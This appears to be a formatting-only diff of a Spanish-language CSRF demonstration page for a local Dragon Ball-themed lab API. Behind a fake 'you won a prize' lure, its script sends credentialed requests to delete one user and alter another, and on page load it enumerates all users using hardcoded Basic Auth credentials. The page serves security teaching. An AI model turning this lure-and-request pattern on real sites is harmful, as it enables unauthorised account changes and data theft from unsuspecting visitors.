@@ -1,231 +1,287 @@
 <!DOCTYPE html>
 <html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>🎁 ¡GANASTE UN PREMIO!</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 50px;
-            margin: 0;
-        }
-        .prize-box {
-            background: white;
-            color: #333;
-            padding: 40px;
-            border-radius: 10px;
-            max-width: 500px;
-            margin: 0 auto;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-        }
-        h1 {
-            color: #667eea;
-            margin-top: 0;
-        }
-        button {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: background 0.3s;
-        }
-        button:hover {
-            background: #ff5252;
-        }
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        #result {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 5px;
-            display: none;
-            font-weight: bold;
-        }
-        .success {
-            background: #51cf66;
-            color: white;
-        }
-        .error {
-            background: #ff6b6b;
-            color: white;
-        }
-        .warning {
-            background: #ffd43b;
-            color: #333;
-        }
-        .console-log {
-            background: #1e1e1e;
-            color: #4ec9b0;
-            padding: 15px;
-            border-radius: 5px;
-            text-align: left;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            margin-top: 20px;
-            max-height: 300px;
-            overflow-y: auto;
-            display: none;
-        }
-        .console-log div {
-            margin: 5px 0;
-        }
-        .console-error {
-            color: #f48771;
-        }
-        .console-success {
-            color: #4ec9b0;
-        }
-        .console-warning {
-            color: #dcdcaa;
-        }
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        padding: 50px;
+        margin: 0;
+      }
+      .prize-box {
+        background: white;
+        color: #333;
+        padding: 40px;
+        border-radius: 10px;
+        max-width: 500px;
+        margin: 0 auto;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+      }
+      h1 {
+        color: #667eea;
+        margin-top: 0;
+      }
+      button {
+        background: #ff6b6b;
+        color: white;
+        border: none;
+        padding: 15px 40px;
+        font-size: 18px;
+        border-radius: 5px;
+        cursor: pointer;
+        margin-top: 20px;
+        transition: background 0.3s;
+      }
+      button:hover {
+        background: #ff5252;
+      }
+      button:disabled {
+        background: #ccc;
+        cursor: not-allowed;
+      }
+      #result {
+        margin-top: 20px;
+        padding: 15px;
+        border-radius: 5px;
+        display: none;
+        font-weight: bold;
+      }
+      .success {
+        background: #51cf66;
+        color: white;
+      }
+      .error {
+        background: #ff6b6b;
+        color: white;
+      }
+      .warning {
+        background: #ffd43b;
+        color: #333;
+      }
+      .console-log {
+        background: #1e1e1e;
+        color: #4ec9b0;
+        padding: 15px;
+        border-radius: 5px;
+        text-align: left;
+        font-family: "Courier New", monospace;
+        font-size: 12px;
+        margin-top: 20px;
+        max-height: 300px;
+        overflow-y: auto;
+        display: none;
+      }
+      .console-log div {
+        margin: 5px 0;
+      }
+      .console-error {
+        color: #f48771;
+      }
+      .console-success {
+        color: #4ec9b0;
+      }
+      .console-warning {
+        color: #dcdcaa;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <div class="prize-box">
-        <h1>🎉 ¡FELICIDADES!</h1>
-        <p>Has sido seleccionado para recibir <strong>1,000,000 zenís</strong></p>
-        <p style="font-size: 14px; color: #666; margin-top: 20px;">
-            ⚠️ Esta es una demostración de vulnerabilidad CSRF
-        </p>
-        <p>Haz clic en el botón para "reclamar" tu premio:</p>
-        <button onclick="reclamarPremio()">🎁 RECLAMAR AHORA</button>
-        <div id="result"></div>
-        <div id="console" class="console-log"></div>
+      <h1>🎉 ¡FELICIDADES!</h1>
+      <p>Has sido seleccionado para recibir <strong>1,000,000 zenís</strong></p>
+      <p style="font-size: 14px; color: #666; margin-top: 20px">
+        ⚠️ Esta es una demostración de vulnerabilidad CSRF
+      </p>
+      <p>Haz clic en el botón para "reclamar" tu premio:</p>
+      <button onclick="reclamarPremio()">🎁 RECLAMAR AHORA</button>
+      <div id="result"></div>
+      <div id="console" class="console-log"></div>
     </div>
 
     <script>
-        // 🔴 ATAQUE CSRF: Esta función ejecuta acciones maliciosas
-        // sin que el usuario lo sepa completamente
-        
-        const consoleDiv = document.getElementById('console');
-        
-        function logToConsole(message, type = 'log') {
-            const div = document.createElement('div');
-            div.className = 'console-' + type;
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            consoleDiv.appendChild(div);
-            consoleDiv.style.display = 'block';
-            consoleDiv.scrollTop = consoleDiv.scrollHeight;
-            console.log(message);
-        }
+      // 🔴 ATAQUE CSRF: Esta función ejecuta acciones maliciosas
+      // sin que el usuario lo sepa completamente
 
-        function reclamarPremio() {
-            const button = document.querySelector('button');
-            button.disabled = true;
-            button.textContent = 'Procesando...';
-            
-            logToConsole('🔴 Iniciando ataque CSRF...', 'warning');
-            logToConsole('🔴 Intentando eliminar usuario con ID 1 (Goku)...', 'log');
+      const consoleDiv = document.getElementById("console");
 
-            // ATAQUE 1: Eliminar al usuario más poderoso (Goku - ID 1)
-            fetch('http://localhost:8080/api/users/1', {
-                method: 'DELETE',
-                credentials: 'include', // 🔴 Incluye las credenciales del usuario
-                headers: {
-                    // Si el usuario tiene Basic Auth almacenado, lo usa automáticamente
-                    'Authorization': 'Basic YnVsbWE6cGFzc3dvcmQ=' // bulma:password (admin)
-                }
+      function logToConsole(message, type = "log") {
+        const div = document.createElement("div");
+        div.className = "console-" + type;
+        div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+        consoleDiv.appendChild(div);
+        consoleDiv.style.display = "block";
+        consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        console.log(message);
+      }
+
+      function reclamarPremio() {
+        const button = document.querySelector("button");
+        button.disabled = true;
+        button.textContent = "Procesando...";
+
+        logToConsole("🔴 Iniciando ataque CSRF...", "warning");
+        logToConsole(
+          "🔴 Intentando eliminar usuario con ID 1 (Goku)...",
+          "log"
+        );
+
+        // ATAQUE 1: Eliminar al usuario más poderoso (Goku - ID 1)
+        fetch("http://localhost:8080/api/users/1", {
+          method: "DELETE",
+          credentials: "include", // 🔴 Incluye las credenciales del usuario
+          headers: {
+            // Si el usuario tiene Basic Auth almacenado, lo usa automáticamente
+            Authorization: "Basic YnVsbWE6cGFzc3dvcmQ=", // bulma:password (admin)
+          },
+        })
+          .then((response) => {
+            if (response.ok) {
+              logToConsole(
+                "✅ ¡ATAQUE EXITOSO! Goku ha sido eliminado de la base de datos",
+                "success"
+              );
+              mostrarResultado(
+                '🎉 "PREMIO RECLAMADO" (En realidad: Goku eliminado 😈)',
+                "success"
+              );
+            } else if (response.status === 401) {
+              logToConsole(
+                "❌ No estás autenticado. Intenta primero hacer login con Bulma",
+                "error"
+              );
+              mostrarResultado(
+                "❌ Necesitas autenticarte primero (ve a /api/auth/login)",
+                "error"
+              );
+            } else if (response.status === 403) {
+              logToConsole(
+                "❌ No tienes permisos de ADMIN. Usa usuario: bulma, password: password",
+                "error"
+              );
+              mostrarResultado(
+                "❌ No tienes permisos de admin (necesitas rol ADMIN)",
+                "error"
+              );
+            } else {
+              logToConsole(`❌ Error: ${response.status}`, "error");
+              mostrarResultado("❌ Error en el ataque", "error");
+            }
+            button.disabled = false;
+            button.textContent = "🎁 RECLAMAR AHORA";
+          })
+          .catch((error) => {
+            logToConsole("⚠️ Error de conexión: " + error.message, "error");
+            mostrarResultado(
+              "⚠️ Error en la conexión. ¿Está corriendo el servidor?",
+              "warning"
+            );
+            button.disabled = false;
+            button.textContent = "🎁 RECLAMAR AHORA";
+          });
+
+        // ATAQUE 2: Modificar nivel de poder de Vegeta
+        setTimeout(() => {
+          logToConsole(
+            "🔴 Intentando reducir el poder de Vegeta (ID 2) a 1...",
+            "log"
+          );
+
+          fetch("http://localhost:8080/api/users/2/power?newPower=1", {
+            method: "PATCH",
+            credentials: "include",
+            headers: {
+              Authorization: "Basic YnVsbWE6cGFzc3dvcmQ=",
+            },
+          })
+            .then((response) => {
+              if (response.ok) {
+                logToConsole(
+                  "✅ ¡ATAQUE EXITOSO! Vegeta ahora tiene poder nivel 1",
+                  "success"
+                );
+              } else {
+                logToConsole(
+                  `❌ No se pudo modificar a Vegeta (código: ${response.status})`,
+                  "error"
+                );
+              }
             })
-            .then(response => {
-                if (response.ok) {
-                    logToConsole('✅ ¡ATAQUE EXITOSO! Goku ha sido eliminado de la base de datos', 'success');
-                    mostrarResultado('🎉 "PREMIO RECLAMADO" (En realidad: Goku eliminado 😈)', 'success');
-                } else if (response.status === 401) {
-                    logToConsole('❌ No estás autenticado. Intenta primero hacer login con Bulma', 'error');
-                    mostrarResultado('❌ Necesitas autenticarte primero (ve a /api/auth/login)', 'error');
-                } else if (response.status === 403) {
-                    logToConsole('❌ No tienes permisos de ADMIN. Usa usuario: bulma, password: password', 'error');
-                    mostrarResultado('❌ No tienes permisos de admin (necesitas rol ADMIN)', 'error');
-                } else {
-                    logToConsole(`❌ Error: ${response.status}`, 'error');
-                    mostrarResultado('❌ Error en el ataque', 'error');
-                }
-                button.disabled = false;
-                button.textContent = '🎁 RECLAMAR AHORA';
-            })
-            .catch(error => {
-                logToConsole('⚠️ Error de conexión: ' + error.message, 'error');
-                mostrarResultado('⚠️ Error en la conexión. ¿Está corriendo el servidor?', 'warning');
-                button.disabled = false;
-                button.textContent = '🎁 RECLAMAR AHORA';
+            .catch((error) => {
+              logToConsole(
+                "⚠️ Error al atacar a Vegeta: " + error.message,
+                "error"
+              );
             });
+        }, 1000);
+      }
 
-            // ATAQUE 2: Modificar nivel de poder de Vegeta
-            setTimeout(() => {
-                logToConsole('🔴 Intentando reducir el poder de Vegeta (ID 2) a 1...', 'log');
-                
-                fetch('http://localhost:8080/api/users/2/power?newPower=1', {
-                    method: 'PATCH',
-                    credentials: 'include',
-                    headers: {
-                        'Authorization': 'Basic YnVsbWE6cGFzc3dvcmQ='
-                    }
-                })
-                .then(response => {
-                    if (response.ok) {
-                        logToConsole('✅ ¡ATAQUE EXITOSO! Vegeta ahora tiene poder nivel 1', 'success');
-                    } else {
-                        logToConsole(`❌ No se pudo modificar a Vegeta (código: ${response.status})`, 'error');
-                    }
-                })
-                .catch(error => {
-                    logToConsole('⚠️ Error al atacar a Vegeta: ' + error.message, 'error');
-                });
-            }, 1000);
-        }
+      function mostrarResultado(mensaje, tipo) {
+        const resultDiv = document.getElementById("result");
+        resultDiv.textContent = mensaje;
+        resultDiv.className = tipo;
+        resultDiv.style.display = "block";
+      }
 
-        function mostrarResultado(mensaje, tipo) {
-            const resultDiv = document.getElementById('result');
-            resultDiv.textContent = mensaje;
-            resultDiv.className = tipo;
-            resultDiv.style.display = 'block';
-        }
+      // 🔴 ATAQUE AUTOMÁTICO: Se ejecuta al cargar la página sin que el usuario haga clic
+      window.onload = function () {
+        logToConsole(
+          "🔴 Página maliciosa cargada. Preparando reconocimiento...",
+          "warning"
+        );
 
-        // 🔴 ATAQUE AUTOMÁTICO: Se ejecuta al cargar la página sin que el usuario haga clic
-        window.onload = function() {
-            logToConsole('🔴 Página maliciosa cargada. Preparando reconocimiento...', 'warning');
-            
-            // Esperamos 2 segundos y ejecutamos reconocimiento silencioso
-            setTimeout(() => {
-                logToConsole('🔴 Ejecutando reconocimiento silencioso de usuarios...', 'log');
-                
-                // Listar usuarios para obtener información
-                fetch('http://localhost:8080/api/users', {
-                    credentials: 'include',
-                    headers: {
-                        // Intenta con credenciales de usuario normal primero
-                        'Authorization': 'Basic Z29rdTpwYXNzd29yZA==' // goku:password
-                    }
-                })
-                .then(response => {
-                    if (response.ok) {
-                        return response.json();
-                    } else {
-                        throw new Error(`HTTP ${response.status}`);
-                    }
-                })
-                .then(data => {
-                    logToConsole('✅ INFORMACIÓN ROBADA: ' + data.length + ' usuarios encontrados', 'success');
-                    data.forEach(user => {
-                        logToConsole(`  - ${user.username} (${user.role}): ${user.powerLevel} poder`, 'log');
-                    });
-                })
-                .catch((error) => {
-                    logToConsole('⚠️ No se pudo obtener lista de usuarios: ' + error.message, 'warning');
-                    logToConsole('💡 Necesitas autenticarte primero para ver el ataque completo', 'warning');
-                });
-            }, 2000);
-        };
+        // Esperamos 2 segundos y ejecutamos reconocimiento silencioso
+        setTimeout(() => {
+          logToConsole(
+            "🔴 Ejecutando reconocimiento silencioso de usuarios...",
+            "log"
+          );
+
+          // Listar usuarios para obtener información
+          fetch("http://localhost:8080/api/users", {
+            credentials: "include",
+            headers: {
+              // Intenta con credenciales de usuario normal primero
+              Authorization: "Basic Z29rdTpwYXNzd29yZA==", // goku:password
+            },
+          })
+            .then((response) => {
+              if (response.ok) {
+                return response.json();
+              } else {
+                throw new Error(`HTTP ${response.status}`);
+              }
+            })
+            .then((data) => {
+              logToConsole(
+                "✅ INFORMACIÓN ROBADA: " +
+                  data.length +
+                  " usuarios encontrados",
+                "success"
+              );
+              data.forEach((user) => {
+                logToConsole(
+                  `  - ${user.username} (${user.role}): ${user.powerLevel} poder`,
+                  "log"
+                );
+              });
+            })
+            .catch((error) => {
+              logToConsole(
+                "⚠️ No se pudo obtener lista de usuarios: " + error.message,
+                "warning"
+              );
+              logToConsole(
+                "💡 Necesitas autenticarte primero para ver el ataque completo",
+                "warning"
+              );
+            });
+        }, 2000);
+      };
     </script>
-</body>
+  </body>
 </html>
